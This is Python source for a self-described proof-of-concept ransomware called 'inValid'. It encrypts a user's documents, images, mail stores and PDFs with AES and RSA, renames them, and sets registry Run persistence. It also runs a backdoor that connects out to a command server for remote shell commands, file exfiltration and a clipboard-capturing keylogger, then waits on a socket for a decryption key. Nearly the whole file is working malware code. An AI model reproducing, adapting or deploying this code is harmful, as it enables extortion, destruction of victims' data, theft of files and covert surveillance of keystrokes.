import os
import base64
from ctypes import *
from multiprocessing import Process
import socket
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA  
from Crypto.Cipher import PKCS1_OAEP

def find_files(path, dec):              # to find files
    file_format = {'.DOC': 0, '.DOCX': 0, '.TXT': 0, '.JPEG': 0, '.PNG': 0, '.JPG': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.AVI': 0, '.PDF': 0}
    if dec==True:
        file_format = {'.INVALID': 0} # just so he decrypts encrypted files
    files = []
    for actual_path, directories, files_found in os.walk(path):
        for arq in files_found:
            extensao = os.path.splitext(arq)[1].upper()
            if(file_format.get(extensao) == 0 or extensao == ''):
                files.append(os.path.join(actual_path, arq))
    return files

def dec_clKey(srvkey):                  # decrypt client private key with server private key
    with open(path + ".inValid.sys", "rb") as pkey:
        enc = pkey.read()               # read private key
    offset = 0
    chunk_size = 512
    decrypted = ""
    srvkey = PKCS1_OAEP.new(RSA.importKey(srvkey))
    while offset < len(enc):            # decrypting
        chunk = enc[offset: offset + chunk_size]
        decrypted += (srvkey.decrypt(chunk)).decode()
        offset += chunk_size
    
    return RSA.importKey(decrypted)

def crypt_clkey():                      # crypt client private key
    # hardcoded public key ... yep not the best idea, but its just a poc so !
    Srv_key = RSA.importKey("""-----BEGIN PUBLIC KEY-----
    Server Public KEY 4094
    -----END PUBLIC KEY-----""")
    key = RSA.generate(2048)                                # generating client keys
    pubKey =  key.publickey().exportKey('PEM')
    privKey = key.exportKey('PEM')

    chunk_size = 470
    offset = 0
    end_loop = False
    encrypted =  b''
    Srv_key = PKCS1_OAEP.new(Srv_key)
    while not end_loop:                                     # encrypt clients private key with servers pub key
        chunk = privKey[offset:offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            end_loop = True
            chunk += b' ' * (chunk_size - len(chunk))
        encrypted += Srv_key.encrypt(chunk)
        offset += chunk_size
            
    with open(path + ".inValid.sys", "wb") as pkey:         # save keys for decryption, if there is any :D
        pkey.write(encrypted)
        
    with open(path + ".inValid.noob", "wb") as pkey:
        pkey.write(pubKey)

def inValid(cli_key):                   # crypt found files with aes, each file has his own aes key and iv
    files = find_files(path, False)    
    for found_file in files:
        iv = os.urandom(16)             # some random
        key = os.urandom(32)            # values for AES 
        sym_crypt = AES.new(key, AES.MODE_CBC, iv)
        asym_key = PKCS1_OAEP.new(cli_key)
        key = asym_key.encrypt(key)     # encrypting key
        iv = asym_key.encrypt(iv)       # and iv to save them in a file
        with open(found_file, 'rb+') as f:          # open file and encrypt it 
            file_content = f.read()
            if len(file_content) % 16 != 0:         # just some padding fe AES
                file_content += b' ' * (16-len(file_content) %16)
            f.seek(0)
            final_data = sym_crypt.encrypt(file_content)    # overwrite content
            f.write(key + iv + final_data)
        os.rename(found_file, found_file + '.inValid')      # rename file

def deValid(ServKey):                   # decrypt encrypted files with server priv key
    asym_key = PKCS1_OAEP.new(ServKey)
    files = find_files(path, True)
    for inv_file in files:
        if inv_file.split('.')[-1] == 'inValid':
            with open(inv_file, 'rb+') as f:
                key = f.read(256)
                iv = f.read(256)
                data = f.read()
                key = asym_key.decrypt(key)
                iv = asym_key.decrypt(iv)
                sym_crypt = AES.new(key, AES.MODE_CBC, iv)
                final_data = sym_crypt.decrypt(data)
                f.truncate(0)
                f.seek(0)
                f.write(final_data)
            os.rename(inv_file, '.'.join(i for i in inv_file.split('.')[:-1]))

def bibi():
    import socket
    import subprocess
    import os
    import threading
    import pythoncom
    import pyHook
    import win32clipboard


    host = "127.0.0.1"          # can use vps @
    port = 443

    s = socket.socket()
    s.connect((host, port))

    def KeyStroke(event):       # function to capture keystrokes ... thx python libs
        if event.Ascii > 32 and event.Ascii < 127:
            typed = chr(event.Ascii)
        else:
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                typed = "[PASTE] - %s" % (pasted_value)
            else:
                typed = "[%s]" % event.Key
        
        with open("out.txt", "a") as ff:
            ff.write(typed)
        return True

    def keylogger():            # starting keylogger 
        kl = pyHook.HookManager()
        kl.KeyDown = KeyStroke
        kl.HookKeyboard()
        pythoncom.PumpMessages()


    def execCMD(cmd):          # simple command exec on target
        comm = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stout, err = comm.communicate()
        if not stout:
            s.send(err)
        else:
            s.send(stout)

    def downloader(file):     # may be used to retrive data from the victim
        if os.path.exists(file):
            with open(file, 'rb') as file_to_send:
                for data in file_to_send:
                    s.sendall(data)
        else:
            s.send(b'[-] File Does not exist / wrong path! :(\n')


    kilog = False
    while True:                     # simple response sent to server to command the virus
        s.send(b'~inValid> ')
        order = s.recv(512).decode().split()
        if order != []:
            if order[0] == "exit":
                break
            if order[0] == "cmd":
                execCMD(' '.join(order[1:]))
            elif order[0] == "download":
                downloader(order[1])
            elif order[0] == "keylog_start":
                if kilog == False:
                        kilog = True
                        KL = threading.Thread(target=keylogger)
                        KL.start()
            elif order[0] == "keylog_stop":
                if kilog == True:
                    kilog = False
                    s.send(b'[+] Keylogger Stopped! :)\n')
                else:
                    s.send(b'[!] Keylogger Not Running\n')



def run_persist(path): # add startup registry... super general
        os.system('cmd /c REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Windows" /t REG_SZ /F /D "C:\\' + path +'\\iv.exe"')



path = os.path.expanduser('~')      # get user's home dir
if __name__ == "__main__":
    if not os.path.exists(path + ".inValid.sys"):
        crypt_clkey()               # gen keys if did not run already on this machine (checking with privkey existance)
        run_persist(path)           

    with open(path + ".inValid.noob", "rb") as pkey:
        cle = RSA.importKey(pkey.read())

    inValid(cle)                    # do what you have to do
    b = Process(target=bibi)        # new thread for the other features
    b.start()
    
    # when listn all day for key, if receved , try decrypt with that key 
    sock = socket.socket()
    sock.bind(('',3333))
    sock.listen(5)

    while True:
        c, addr = sock.accept()
        serverkey = c.recv(4096).decode()
        serverkey += c.recv(4096).decode()
        dec = dec_clKey(serverkey)
        deValid(dec)

